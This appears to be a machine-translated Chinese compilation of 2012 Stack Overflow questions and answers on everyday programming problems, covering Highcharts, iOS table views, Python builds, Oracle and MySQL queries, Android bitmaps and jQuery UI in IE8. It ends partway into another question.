问题是当数据数量变化时，高度也在变化，我们不能像struts2标签那样固定高度吗？...通过动态传递数据

# php - Highcharts 定制 PHP/MySQL

> ID：10084372
> 
> 赞同：3
> 
> 时间：2012-04-10T06:55:22.963
> 
> 标签：php, javascript, jquery, mysql, highcharts

我正在尝试自定义图表并向我们的客户提供演示以供他们批准。

我们现在面临的一些最终问题是，

1.  问题：是否可以在柱形图的高图中进行分页。假设我们有 50 或 100 列。

    > 我们怎样才能避免我们的图表变得拥挤。

    例如看看这个 js fiddle

    > [http://jsfiddle.net/justin69/4xSNU/1/](http://jsfiddle.net/justin69/4xSNU/1/)

2.  问题：如果我们将图像或徽标嵌入到图表中并尝试使用其中之一导出它`jpg`/`jpeg`我们会收到错误。

    > 在 jsfidlle 上它可以工作，
    > 
    > 但在我们的本地主机上，它会给出以下错误消息。

    `About to transcode 1 SVG file(s) Converting 551bc090a93c120f987375135e7744db.svg to temp/551bc090a93c120f987375135e7744db.jpg ... ... error ( SVGConverter.error.while.rasterizing.file)
    Error while converting SVG. SVG code for debugging:`

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-18T16:00:13.713

让我们看看我能不能帮你...

## “图表拥挤”

我可以想象三种避免图表“拥挤”的方法：

## 方法一：让用户选择看什么。

隐藏添加`visible: false`到您的部分或全部系列中，使用它可以让用户选择他想要查看的数据。例如：

```
series: [
            {
                name: ...,
                data: ...,
                visible: false
            },
            ...
        ] 
```

* * *

如果您选择此示例，您还可以考虑添加一个按钮来显示/隐藏所有内容，您可以通过以下方式实现：

隐藏所有内容：

```
for(i=0; i < chart.series.length-1; i++)
    chart.series[i].hide(); 
```

显示一切：

```
for(i=0; i < chart.series.length-1; i++)
    chart.series[i].show(); 
```

* * *

## 方法2：解决问题

**或者**，您可以`zoomType: 'x'`在图表中使用允许用户缩放并详细查看数据，然后用户可以使用缩放滚动到图表的左侧和右侧，或者重置缩放并选择另一个要查看的点。

* * *

## 方法三：溢出

**或者**，您可以创建一个巨大的图表并使用溢出来允许图表 div 可滚动，或者隐藏溢出并管理`scrollX`&`scrollY`槽 jQuery。

* * *

**您能否提供 svg 示例的代码或链接，以便我检查您的代码并查看是否可以帮助您？**

谢谢你。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-24T10:32:27.007

**1\. 拥挤的图表**

**一种。**你试过旋转标签吗？这将显着减少您之前拥有的标签上的过度拥挤。

这是您的带有标签 mod 的小提琴：http: [//jsfiddle.net/kayen/YSwk4/](http://jsfiddle.net/kayen/YSwk4/)

**湾。**如果您有很多值并且受 x 轴上的空间限制，您可以将**柱形图**转换为**条形图**。

这是您使用条形图 mod 的小提琴：http: [//jsfiddle.net/kayen/QqPha/](http://jsfiddle.net/kayen/QqPha/)

我建议使用第一个选项，因为您可以在同一个空间中容纳更多的值并且拥有更清晰的图表。

# objective-c - 刷新 UITableView 自定义单元格时延迟

> ID：10084373
> 
> 赞同：2
> 
> 时间：2012-04-10T06:55:27.427
> 
> 标签：objective-c, ios5, uitableview

我有一个带有自定义单元格的 UITableView，我在解析 xml 数据后填充（使用数组信息服务）。

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"Cell";

    ApplicationCell *cell = (ApplicationCell *)[tableView dequeueReusableCellWithIdentifier:CellIdentifier];
        if (cell == nil) {
            [self.cellNib instantiateWithOwner:self options:nil];
            cell = tmpCell;
            self.tmpCell = nil;          
        }       

        infoService *e = [self.infoservices objectAtIndex:indexPath.row];

        cell.name = [e  infoName];

        NSString *infodetails = [e infoDetails];

        if ( infodetails == nil ) {
            cell.details = @"Loading...";
            [self startInfoDownload:e forIndexPath:indexPath];

            NSLog(@"Loading...");
        } else  {
            cell.details = infodetails;
            NSLog(@"Show info detail: %@", infodetails );
        }
        return cell;
}

- (void)infoDidFinishLoading:(NSIndexPath *)indexPath
{
    infoDownloader *infoserv = [imageDownloadsInProgress objectForKey:indexPath];
    if (infoserv != nil)
    {

        [infoservices replaceObjectAtIndex:[indexPath row] withObject:infoserv.appRecord];

        NSIndexPath *a = [NSIndexPath indexPathForRow:indexPath.row inSection:0]; // I wanted to update this cell specifically
        ApplicationCell *cell = (ApplicationCell *)[self.tableView cellForRowAtIndexPath:a];
        cell.details = [[infoservices objectAtIndex:[indexPath row]] infoDetails];

        NSLog(@"Updating=%@", [[infoservices objectAtIndex:[indexPath row]] infoDetails]);
    }
} 
```

对于每个单元格，我使用 NSURLConnection sendAsynchronousRequest 从对象 infoDownloader 检索和解析 xml 数据

```
- (void)startDownload 
```

对于每个单独的单元格。

成功解析数据后，调用来自 infoDownloader 的委托方法

```
- (void)infoDidFinishLoading:(NSIndexPath *)indexPath 
```

问题是，虽然

```
- (void)infoDidFinishLoading:(NSIndexPath *)indexPath 
```

在解析每个单元格后被调用，我可以看到

```
NSLog(@"Updating=%@", [[infoservices objectAtIndex:[indexPath row]] infoDetails]); 
```

在具有正确详细信息的调试器中，单元格不会立即刷新，而是在 6 或 7 秒后刷新。也不会调用 cellForRowAtIndexPath

```
- (void)infoDidFinishLoading:(NSIndexPath *)indexPath 
```

出于某种原因，因为在 infoDidFinishLoading 之后没有调试输出。我也不明白 cell.details 是如何实际刷新的，因为 cellForRowAtIndexPath 不再被调用。

我尝试使用 Apple 的 LazyTableImages 加载示例设置此功能，我已成功使用该示例，但我不知道出了什么问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:27:02.823

`reloadRowsAtIndexPaths`加载数据后，您可能需要调用。可能发生的情况是单元格数据已加载，但单元格绘图未更新。

另外我相信您的代码可以多次请求相同的数据，因为如果`[e infoDetails]`发出`nil`请求，但是在加载数据之前可能会多次请求单元格，因此`[self startInfoDownload:e forIndexPath:indexPath]`会被多次调用，下载相同的数据。您应该考虑跟踪您请求数据的行。

查看此代码以获取有关如何解决此问题的一些想法：[https ://github.com/kgn/Spectttator/blob/master/SpectttatorTest-iOS/RootViewController.m#L123](https://github.com/kgn/Spectttator/blob/master/SpectttatorTest-iOS/RootViewController.m#L123)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T09:40:56.083

任何影响 UI 的更改都必须在主线程上执行。

刷新 tableView，通过更改单元格详细信息，重新加载 tabe 视图，重新加载行......是影响 UI 的更改。

特别是，您应该使用以下命令在主线程中执行更改：

```
dispatch_async(dispatch_get_main_queue(), ^{
    cell.details = [[infoservices objectAtIndex:[indexPath row]] infoDetails];
} 
```

或在 iOS 4 之前：

```
cell performSelectorOnMainThread:@selector(setDetails:) withObject:[[infoservices objectAtIndex:[indexPath row]] infoDetails]; 
```

# python - Mac Lion 上的 Python 2.5.6 构建错误

> ID：10084379
> 
> 赞同：1
> 
> 时间：2012-04-10T06:56:11.980
> 
> 标签：python, build, osx-lion, web2py

这是我想做的。将 web2py 与 MySQL 一起使用。

为此，我需要使用源 web2py 而不是 web2py.app 要使用 web2py，我需要 Python 2.5

我在构建和安装 Python 2.5 时遇到问题

我从 Python 发布页面下载了 Python-2.5.6.tgz。现在，我做到了

> 。/配置

进而

> 制作

然后，我收到以下错误。

> gcc -c -fno-strict-aliasing -Wno-long-double -no-cpp-precomp -mno-fused-madd -DNDEBUG -g -fwrapv -O3 -Wall -Wstrict-prototypes -I。-IInclude -I./Include -DPy_BUILD_CORE -o Modules/python.o ./Modules/python.c cc1：错误：无法识别的命令行选项“-Wno-long-double” make：*** [Modules/python.o] 错误1

任何人都可以帮助我如何摆脱这个错误并安装 Python 2.5？

这是我正在使用的 gcc

> gcc 版本 4.2.1（基于 Apple Inc. build 5658）（LLVM build 2336.9.00）

您的帮助将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T14:35:58.873

web2py 适用于 Lion 的 Python 2.7。除非您有令人信服的理由使用 2.5，否则请坚持使用 2.7。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:15:13.860

我使用 web2py 应用程序和 MySQL 在 iMac OSX Lion 上安装了 web2py。我没有遇到任何你不能将应用程序与 MySQL 一起使用的原因。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-04T19:39:34.970

要在 OS X 上安装 Python，请尝试使用 python.org 上提供的通用二进制文件（记录在[http://docs.python.org/2/using/mac.html](http://docs.python.org/2/using/mac.html)）。

有关Python 2.5 的最新通用二进制文件，请参阅[http://www.python.org/ftp/python/2.5.4/python-2.5.4-macosx.dmg 。](http://www.python.org/ftp/python/2.5.4/python-2.5.4-macosx.dmg)

# video - 如何使用 fancybox 播放全屏视频

> ID：10084383
> 
> 赞同：1
> 
> 时间：2012-04-10T06:56:43.677
> 
> 标签：video, iframe, fancybox

我在用：

1.  fancyBox -----> 在弹出窗口中显示视频
2.  Videojs------->播放视频

视频上的全屏按钮将其播放到fancybox 中使用的iframe 大小。我想把它播放到屏幕的实际大小......这怎么可能......请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-17T12:13:36.897

使用内联 HTML 而不是 iframe - fancybox 支持它

```
<a id="inline" href="#data">This shows content of element who has id="data"</a>

<div style="display:none"><div id="data"><video ...>Lorem ipsum dolor sit amet, consectetur adipiscing elit.</div></div> 
```

# c# - 获取列表而不是简单的字段属性

> ID：10084385
> 
> 赞同：0
> 
> 时间：2012-04-10T06:56:58.563
> 
> 标签：c#, entity-framework, list

我正在使用实体框架 4.0。

在我的项目中，我需要从属性获取和设置值。一切正常，但我现在必须得到一个**列表**并设置任何类型的**列表**。所以我不知道该怎么做。

一个简单的字段属性看起来像什么（来自代码的原始*，有效*）：

```
businnesObject.GetType().GetProperty(entityBase.GetType().Name).SetValue(businnesObject, entityBase, null); 
```

而我真正需要的是类似的东西（*不起作用*）：

```
EntityBase mainEntity = (EntityBase)navigationPropertyAnzeigeUserControl.SelectedObject;
List<Object> collection = (List<Object>)businnesObject.GetType().GetProperty(mainEntity.GetType().Name).GetValue(businnesObject, null);
collection.Add(mainEntity);
businnesObject.GetType().GetProperty(mainEntity.GetType().Name).SetValue(businnesObject, collection, null); 
```

也许有人可以帮助我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:19:05.543

好的。。

```
mainEntity = (EntityBase)navigationPropertyAnzeigeUserControl.SelectedObject;
                    IEnumerable<object> collection = (IEnumerable<object>)businnesObject.GetType().GetProperty("Positionen").GetValue(businnesObject, null);
                    List<object> test = collection.ToList();
                    test.Add(mainEntity);
                    businnesObject.GetType().GetProperty(LoescheAlleZeichenNachEinemGewissenZeichen(mainEntity.GetType().Name, '_')).SetValue(businnesObject, collection, null); 
```

# php - 是否允许 POST 空数据？

> ID：10084389
> 
> 赞同：0
> 
> 时间：2012-04-10T06:57:10.280
> 
> 标签：php, apache, http, post, http-post

对于我正在开发的 Web API，我想做一些类似于 Facebook Graph API 的事情。一个用户可以邀请另一个用户。要接受或拒绝邀请，其他用户需要执行空 POST 以：

```
/invitation/<invitationId>/accepted 
```

或者

```
/invitation/<invitationId>/rejected 
```

但是，这对我不起作用，因为当我发布空数据时，PHP（或 Apache？）返回以下错误：

> 请求的实体太大！
> 
> POST方式不允许数据传输，或者数据量超过容量限制。

显然这不是真的，因为 POST 数据是空的（我在 Firebug 中仔细检查过）。所以我的问题是：

*   HTTP 协议是否允许 POST 空数据？如果不是，我想我只会发布一些虚拟数据，但我宁愿避免这种黑客攻击。

*   如果允许，如何让 Apache/PHP 允许请求*？*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T08:17:03.650

我猜你想做某种 RESTful api，这就是为什么你需要发送没有数据的帖子。

Apache/php 应该允许您发送空的 post 数据，限制必须由您正在使用的框架的某些服务器配置施加

你可以用这个简单的文件来测试它：

```
<?php

echo '<h2>This page was requested using ' . $_SERVER['REQUEST_METHOD'] . '</h2>';
echo '<pre>';
print_r($_POST);
echo '</pre>';
?>
<form action="" method="post">
    <input type="submit" value="Request this page using POST" />
</form> 
```

您将看到脚本检测到 post 请求（使用 _SERVER 超全局的 REQUEST_METHOD），即使 _POST 数组是空的

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-10T07:06:13.417

你为什么要做一个 POST 请求？让您的 API 检测是否发送了数据，如果没有数据，则发出 GET 请求。事实上，在大多数情况下发出 GET 请求会更加高效，因为浏览器可以更轻松地缓存该信息（您可以通过发送特定于缓存的标头使您的 API 更智能地利用这一点）。

在您的情况下发出 POST 请求是没有意义的:)

# database - 从 Oracle db 生成 ER 图（缺少外键）

> ID：10084391
> 
> 赞同：0
> 
> 时间：2012-04-10T06:57:14.603
> 
> 标签：database, oracle

有没有什么软件可以从Oracle数据库自动生成ER图？

我的问题是数据库在设计过程中有一些“噪音”，它错过了一些强制性的外键。再者，db的大小相当大，不能简单地遍历每张表手动检查。

任何帮助或建议将不胜感激。

谢谢 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T07:10:11.057

好吧，如果有“缺失”的强制性外键，那么从技术上讲，这些外键不是强制性的，也不是缺失的。但我感觉到你的痛苦。

可能，作为开始，我会搜索共享列名并且其列名出现在表的主键列中的表：

```
select 
  a.table_name,
  b.table_name,
  a.column_name
from
      all_tab_columns   a 
join  all_tab_columns   b on a.table_name != b.table_name and
                             a.column_name = b.column_name
join  all_tables        u on b.table_name  = u.table_name   -- Exlude Views!
join  all_constraints   p on a.table_name  = p.table_name and
                             p.constraint_type = 'P'
join  all_cons_columns  c on p.constraint_name = c.constraint_name and
                             c.column_name = a.column_name 
```

# android - Android：检索amr音频文件的大小

> ID：10084397
> 
> 赞同：0
> 
> 时间：2012-04-10T06:58:02.807
> 
> 标签：android, size, audio-recording

我正在制作一个应用程序，我必须在其中获取amr 文件的**大小。对此的任何帮助将不胜感激。谢谢。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:47:55.357

好像您有路径，只需将路径放在给定的代码中，您将获得文件的长度（以字节为单位）。

```
File file=new File("/sdcard/"+path of the file whose size you want);
long length = file.length(); 
```

希望能帮助到你。

# resteasy - HATEOAS 链接是否可点击

> ID：10084398
> 
> 赞同：2
> 
> 时间：2012-04-10T06:58:04.147
> 
> 标签：resteasy

我需要将链接添加到我的 resteasy api xml 和 json 输出。所以我写了一个 JAXB AtomLink 类如下

```
package samples;
import javax.xml.bind.annotation.XmlAttribute;
import javax.xml.bind.annotation.XmlRootElement;

@XmlRootElement(name="link", namespace="http://www.w3.org/2005/Atom")

public class AtomLink {
    private String rel;
    private String href;
    private String type;

    public AtomLink() {}

    public AtomLink(String rel, String href, String type) {
        this.rel = rel;
        this.href = href;
        this.type = type;
    }

    public AtomLink(String rel, String href) {
        this(rel,href,"application/xml");
    }

    @XmlAttribute
    public String getRel() {
        return rel;
    }
    public void setRel(String rel) {
        this.rel = rel;
    }

    @XmlAttribute
    public String getHref() {
        return href;
    }
    public void setHref(String href) {
        this.href = href;
    }

    @XmlAttribute
    public String getType() {
        return type;
    }
    public void setType(String type) {
        this.type = type;
    }

} 
```

并在我的 JAXB xml 或 json 对象中设置链接值。我得到的输出如下。但链接不可点击。

输出：

```
<data xmlns:ns2="http://www.w3.org/2005/Atom">
<bucket id="2" name="2012-APR-09 12:05 AM">
<av_data unit="percent" value="100"/>
<data_count unit="#" value="10"/>
<pf_data unit="seconds" value="4.618"/>
</bucket>
<ns2:link href="http://localhost:8080/webapp/api/getrawdata?start=3&size=2" rel="next" type="application/xml"/>
</data> 
```

我应该怎么做才能使链接可点击。

提前致谢。安妮莎

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T19:51:39.510

XML 和 JSON 只是基于文本的数据表示。单击链接的能力取决于您用于查看数据的浏览器是否能够将该文本的一部分识别为链接并将其呈现为超链接。

# sql - 如何使用 SQL 计算表中的列数？

> ID：10084400
> 
> 赞同：24
> 
> 时间：2012-04-10T06:58:12.010
> 
> 标签：sql, oracle

如何使用 SQL 计算表中的列数？

我正在使用 Oracle 11g

请帮忙。吨。

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2012-04-10T07:00:26.927

```
select count(*) 
from user_tab_columns
where table_name='MYTABLE' --use upper case 
```

您可以使用 lower 函数代替大写。例如： select count(*) from user_tab_columns where lower(table_name)='table_name';

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-04-10T07:00:09.223

也许是这样的：

```
SELECT count(*) FROM user_tab_columns WHERE table_name = 'FOO' 
```

这将计算表 FOO 中的列数

你也可以

```
select count(*) from all_tab_columns where owner='BAR' and table_name='FOO'; 
```

所有者是架构并注意表名是大写的

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2014-03-03T20:26:21.290

老问题 - 但我最近需要这个以及行数......这是两者的查询 - 按行数 desc 排序：

```
SELECT t.owner, 
       t.table_name, 
       t.num_rows, 
       Count(*) 
FROM   all_tables t 
       LEFT JOIN all_tab_columns c 
              ON t.table_name = c.table_name 
WHERE  num_rows IS NOT NULL 
GROUP  BY t.owner, 
          t.table_name, 
          t.num_rows 
ORDER  BY t.num_rows DESC; 
```

# javascript - Javascript检测不再起作用

> ID：10084401
> 
> 赞同：2
> 
> 时间：2012-04-10T06:58:17.477
> 
> 标签：javascript, wicket

这个周末之后，我的 Wicket 应用程序无法再正确检测到 javascript。它不适用于我的虚拟主机，在我的本地计算机上，我也在另一台计算机上对其进行了测试。

我的检测脚本：

```
WebClientInfo clientInfo = (WebClientInfo)WebSession.get().getClientInfo();
    if(!clientInfo.getProperties().isJavaEnabled()){
        System.out.println("not enabled!");
        WebSession.get().setClientInfo(null);
    } 
```

加上应用程序类中的这个：

```
getRequestCycleSettings().setGatherExtendedBrowserInfo(true); 
```

我还从头开始创建了一个 wicket 应用程序，结果相同，没有 javascript 检测。

在写这篇文章时，我在 Internet Explorer 中检查了它。适用于 IE 8 + 9。不适用于 FF 11.0。检票口版本是 1.5.5。

任何人都可以确认这种行为吗？（可能 JIRA 值得......）

**更新：**我找到了这种行为的原因。`isJavaEnabled`检查是否启用了 Java（不是 Javascript）。Firefox（默默地）在 4 月 2 日阻止了 Java 插件，因此没有设置 javaEnabled 属性：[https](https://addons.mozilla.org/en-US/firefox/blocked/p80) ://addons.mozilla.org/en-US/firefox/blocked/p80 。麻烦。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T11:48:44.047

可能这从来没有奏效，而且它似乎是愚蠢的运气。

查看[ClientProperties.isJavaEnabled()](http://wicket.apache.org/apidocs/1.5/org/apache/wicket/protocol/http/ClientProperties.html#isJavaEnabled%28%29)的 javadocs ，它返回客户端的`navigator.javaEnabled`属性，该属性反映是否启用了**Java**，而不是**JavaScript**。

Java！= JavaScript。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-08-07T04:32:06.633

另一种方法是使用“用户代理”字符串：

```
public boolean javascriptSupported() {
    WebRequest webRequest = (WebRequest) getRequest();
    String userAgent = webRequest.getHeader("User-Agent");
    if (userAgent == null || userAgent.startsWith("Googlebot")) {
        return false;
    }
    return true;
} 
```

`AjaxLazyLoadPanel`尽管您需要扩展上面的用户代理列表，但我已将其用于搜索引擎。

还有`WebRequest.isAjax()`，它也可能有用，因为它用于确定`RedirectPolicy`使用的，因此，当 Javascript 不存在时 Wicket 的行为。

# iphone - iPad 找不到当前位置

> ID：10084405
> 
> 赞同：0
> 
> 时间：2012-04-10T06:58:36.270
> 
> 标签：iphone, ios, ipad, mkmapview

我正在地图视图中显示 iPad 的当前位置，为此我使用以下代码

```
 if ([CLLocationManager locationServicesEnabled]) 
{
    lm = [[CLLocationManager alloc] init];
    lm.delegate = self;
    lm.desiredAccuracy = kCLLocationAccuracyBest;
    lm.distanceFilter = 100.0f;
    [lm startUpdatingLocation];

} 
```

我正在计算纬度和经度并将其作为网址传递

```
NSString *urlString = [NSString stringWithFormat:@"http://maps.google.com/maps?z=15&daddr=%@@%@,%@&saddr=%@@%@,%@",n,lat_New,lng_New,currentLocation,currentLatt,currentLong]; 
```

我没有在地图视图中获得 iPad 初始起点和终点的正确方向。

在 iPad 地图视图中显示正确的初始点和凝视点有什么替代方法吗？应用商店是否会拒绝针对此类问题的应用，请为此建议我一些不错的选择。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T10:45:09.457

有几件事。一个模拟器无法为您提供 GPS 位置。其次，通常第一次返回的 gps 坐标可能不准确。所以尝试通过实现委托来接收位置更新。

# mysql - 这是否可以获得具有偏移限制的总行数

> ID：10084413
> 
> 赞同：11
> 
> 时间：2012-04-10T06:59:08.843
> 
> 标签：mysql, merge, count, offset

嘿Guyz 这有可能获得带有偏移限制的总行数吗

设想

```
SELECT * FROM users limit 0,5; 
```

此查询包含 300 条记录，但问题是如果我用偏移量调用此查询，结果将仅显示 5 条记录，我不想两次编写查询。一个用于分页限制，另一个用于记录总数...

> 我不想要这个

```
SELECT * FROM users limit 0,5; // paging 
SELECT count(*) FROM users; // count 
```

我必须合并此查询或帮助绝对值得赞赏

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-10T07:24:03.713

您可以像这样使用 SQL_CALC_FOUND_ROWS

```
SELECT SQL_CALC_FOUND_ROWS * FROM users limit 0,5; 
```

它在应用任何 LIMIT 子句*之前*获取行数。它确实需要另一个查询来获取结果，但该查询可以简单地

```
SELECT FOUND_ROWS() 
```

因此您不必重复复杂的查询。

# android - 保存为 BLOB 时位图透明度的奇怪问题

> ID：10084416
> 
> 赞同：2
> 
> 时间：2012-04-10T06:59:25.957
> 
> 标签：android, bitmap, blob

陷入位图透明度的一个奇怪问题，我随身携带图像并将其转换为 Blob 并将其存储在本地数据库中。

我有这张图片

![在此处输入图像描述](../Images/5d60a6c48015830592952b077d658f40.png)

在将其存储为 Blob 并获取它之后，图像背景将被填充

![在此处输入图像描述](../Images/1a0bb75691e1a0bec6c29c380957ca29.png)

知道为什么会发生这种情况，并解决它。

谢谢。

这就是我转换为字节并存储到数据库的方式

```
public byte[] BitmapToByte(Bitmap bitmap)
    {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(); 
        bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos); //bm is the bitmap object   
        byte[] b = baos.toByteArray();
        return b;
    } 
```

这就是我从数据库中获取 Blob 作为位图的方式

`mImageView.setImageBitmap(BitmapFactory.decodeByteArray(blob, 0, blob.length));`//按光标排列

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:22:36.120

得到了解决方案，这是使用 Android 的缩略图文件夹的原因（它创建了额外的预览并且我将缩略图光标传递给图像适配器）。当我直接从数据库中获取图像时，它会变得透明。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-23T07:43:34.677

我的问题已解决，只需更改

> Bitmap.CompressFormat.JPG 到 Bitmap.CompressFormat.PNG

```
 public byte[] BitmapToByte(Bitmap bitmap)
        {
            ByteArrayOutputStream baos = new ByteArrayOutputStream(); 
            //bitmap.compress(Bitmap.CompressFormat.JPG, 100, baos); //origin
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos); //fixed

            byte[] b = baos.toByteArray();
            return b;
        } 
```

# objective-c - 不进入我的构造函数

> ID：10084418
> 
> 赞同：1
> 
> 时间：2012-04-10T06:59:51.553
> 
> 标签：objective-c, ios

我在 xcode 4.3 中使用选项卡式视图应用程序。

我只是想初始化我在我的 FirstViewController 的 .h 文件中声明的一些变量。我通过在我的 .m 文件中创建一个构造函数来尝试这样做。

.h 文件：

```
#import <UIKit/UIKit.h>

@interface FirstViewController : UIViewController {

    IBOutlet UITextField *currentGuess;
    IBOutlet UILabel *attemptsMade;
    IBOutlet UILabel *attemptsLeft;
    IBOutlet UITextView *hints;
    int numberToGuess;
    int numberOfGuessesMade;
    int maxGuesses;
    int maxGenNumber;

    NSMutableArray *allGuesses;

}

- (id) init;

@end 
```

.m 文件

```
#import "FirstViewController.h"

@interface FirstViewController ()

@end

@implementation FirstViewController

    - (id) init {
        NSLog(@"entered constructor!");

        if(self = [super init]) 
        {
            numberToGuess = 0;
            numberOfGuessesMade = 0;
            maxGuesses = 3;
            maxGenNumber = 10;
        }

        return self;
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:08:14.953

使用 init 方法初始化 UIViewController 没有意义。通常你需要`- (id)initWithNibName:(NSString *)nibName bundle:(NSBundle *)nibBundle`

如果您从 XIB 文件构建它，那么就这样做

您需要将初始化代码放在 -`(void)awakeFromNib`或`-(void)viewDidLoad`.

像这样适合你的情况

@implementation FirstViewController

```
- (id) awakeFromNib {
    NSLog(@"entered XIB constructor!");

    numberToGuess = 0;
    numberOfGuessesMade = 0;
    maxGuesses = 3;
    maxGenNumber = 10;

} 
```

如果非 xib 则：

```
- (id)initWithNibName:(NSString *)nibName bundle:(NSBundle *)nibBundle {
    NSLog(@"entered constructor!");

    if(self = [super initWithNibName:nibName bundle:nibBundle]) 
    {
        numberToGuess = 0;
        numberOfGuessesMade = 0;
        maxGuesses = 3;
        maxGenNumber = 10;
    }

    return self;
} 
```

记住。init 不是您在 OO 课程中学习的“真正”构造函数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T07:08:00.587

如[UIViewController 文档](http://developer.apple.com/library/ios/#DOCUMENTATION/UIKit/Reference/UIViewController_Class/Reference/Reference.html)中所述，UIViewController的指定初始化程序是`initWithNibName:bundle:`. 但取决于您的视图控制器是如何创建的（例如在代码中或作为故事板的一部分），它甚至可能不会被调用，它可能会被调用`initWithCoder:`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:06:39.937

如果你使用笔尖。`awakeFromNib`方法将被调用。还要检查是否使用 init 方法的变体，如`initWithNibName`,`initWithframe`等。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-10T07:07:41.817

您可以在创建 VC 的位置发布代码吗？如果您从 XIB 执行此操作，则不会调用 init，而是应该重新编写：

```
initWithNibName 
```

# android - SQLite 表中的更新问题

> ID：10084423
> 
> 赞同：0
> 
> 时间：2012-04-10T07:00:11.667
> 
> 标签：android, sqlite

我在**SQLite Android中有一张表**

```
table name- score
columns- rank      time      moves 
```

我想增加那些时间大于给定时间的记录的排名，所以我写了这两个代码。

```
ContentValues updatedValue = new ContentValues();
updatedValue.put(KEY_RANK, KEY_RANK+1); //KEY_RANK is a final string "rank" column name
db.update(SCORE, updatedValue, KEY_TIME_ELAPSED + ">=" + time, null); //KEY_TIME_ELAPSED = "time" 
```

和其他片段是

```
db.rawQuery("UPDATE "+ TABLE_NAME2 + " SET "+ KEY_RANK + " = " + KEY_RANK + " + 1 WHERE " + KEY_TIME_ELAPSED + " >= " + time + ";", null); 
```

在这两种情况下，它都没有更新。谁能说我哪里错了？在我的情况下，这两个片段都是正确的更新方式吗？如果一个或两个都错了，那么请指出哪一个是错的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:09:03.767

如果`KEY_RANK`是一个字符串，您似乎正在尝试将列名设置为`string + 1`.

我相信您应该首先找出该列中的值，然后将其递增，然后将其设置回来。

我不确定你是否可以在一行中做到这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:11:13.927

第二种选择是这样做的方式。但是您需要使用**execSQL**，因为您不希望返回任何游标。

```
db.execSQL("UPDATE "+ TABLE_NAME2 + " SET "+ KEY_RANK + " = " + KEY_RANK + 
" + 1 WHERE " + KEY_TIME_ELAPSED + " >= " + time + ";"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:17:00.037

要调试，您可以尝试执行 db 查询来获取您想要更新的信息，以便您可以看到它正在获取什么。("SELECT * FROM "+ TABLE_NAME2 + " WHERE " + KEY_TIME_ELAPSED + " >= " + time + ";")

除此之外：如果您使用的是 beginTransaction()，请确保有一个 endTransaction()。

# jquery - jquery ui按钮在IE8中单击时崩溃（仅限）

> ID：10084427
> 
> 赞同：1
> 
> 时间：2012-04-10T07:00:38.937
> 
> 标签：jquery, jquery-ui, internet-explorer-8, crash, uibutton

我正在使用带有以下 HTML 的 jquery ui 按钮

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4

/strict.dtd">
<html>
<head>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.5/jquery-ui.min.js"></script>
<link type="text/css" rel="stylesheet"  href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.5/themes/dot-luv/jquery-ui.css"/>
<script type="text/javascript">
$(document).ready(function(){
$('.save,.cancel').button();
});
</script>
</head>
<body>
<ol><li>
<div> 
<a class="save">Save</a>
<a class="cancel">cancel</a>
</div>
</li></ol>
</body>
</html> 
```

单击保存或取消时 IE8（甚至不是 ie7）崩溃并出现以下错误

```
res://ieframe.dll/acr_error.htm# 
```

但是它适用于以下html

```
<div> 
<a class="save">Save</a>
<a class="cancel">cancel</a>
</div> 
```

或者

```
<ol><li>
<a class="save">Save</a>
<a class="cancel">cancel</a>
</li></ol> 
```

我在window7中测试它，对它发疯，任何帮助表示赞赏，谢谢

**更新：** 这修复了它

```
<ol><li>
<div style="display:inline-block;" >
<a class="save" href="#" onclick="return false;" >Save</a>
<a class="cancel" href="#" onclick="return false;" >cancel</a>
</div>
</li></ol> 
```

故事的道德：IE 的废话

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:04:42.523

为什么你的链接周围有一个 div？

我认为在这里您应该尝试取消来自 HTML 的点击。另外，放置一个 href="" 或 href="#" 标签。要取消单击，请使用

```
<a href="#" onclick="return false;" class="save"></a> 
```

可能会解决问题。

# c++ - C中extern存储类说明符的重要性及用法

> ID：10084431
> 
> 赞同：1
> 
